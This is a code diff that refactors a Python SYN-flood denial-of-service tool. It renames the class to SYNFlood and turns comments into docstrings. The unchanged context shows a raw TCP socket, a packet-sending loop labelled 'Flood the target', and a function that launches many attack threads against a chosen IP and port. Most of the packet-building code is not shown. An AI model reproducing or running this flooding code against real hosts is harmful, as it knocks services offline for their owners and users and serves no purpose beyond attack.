@@ -1,4 +1,6 @@
-# Import required modules
+#!/usr/bin/python3
+
+# Imports
 import os
 import sys
 import getopt
@@ -6,26 +8,34 @@ import threading
 import socket
 from struct import *
 
-# Define the synflood() class
-class synflood(threading.Thread):
-	# Class: synflood()
-	# Purpose: Flood the target
-	# Functions: __init__(), run()
+class SYNFlood(threading.Thread):
+	"""Flood the target
 	
-	# Define the __init__() function
+	Methods:
+		__init__() - Initialize the object
+		run() - Start the DoS attack
+	"""
+	
 	def __init__(self, target_ip, target_port):
-		# Function: __init__()
-		# Purpose: Append everything to self
+		"""Initialize the object
+		
+		Arguments:
+			self - object - The SYNFlood
+			target_ip - string - The IP to flood
+			target_port - integer - The port to flood
+		"""
 		
 		# Append everything to self
 		threading.Thread.__init__(self)
 		self.target_ip = target_ip
 		self.target_port = int(target_port)
 		
-	# Define the run() function
 	def run(self):
-		# Function: run()
-		# Purpose: Flood the target
+		"""Start the DoS attack
+		
+		Arguments:
+			self - object - The SYNFlood object
+		"""
 		
 		# Create the socket
 		with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as attack_socket:
@@ -107,10 +117,14 @@ class synflood(threading.Thread):
 				# Flood the target
 				attack_socket.sendto(packet, (dest_ip , 0 ))
 				
-# Define the begin() function
 def begin(attack_threads, target_ip, target_port):
-	# Function: begin()
-	# Purpose: Create attack threads
+	"""Create attack threads
+	
+	Arguments:
+		attack_threads - intiger - The number of threads
+		target_ip - string - The IP to flood
+		target_port - intiger - The port to flood
+	"""
 	
 	# Create the threads
 	for _ in range(int(attack_threads)):
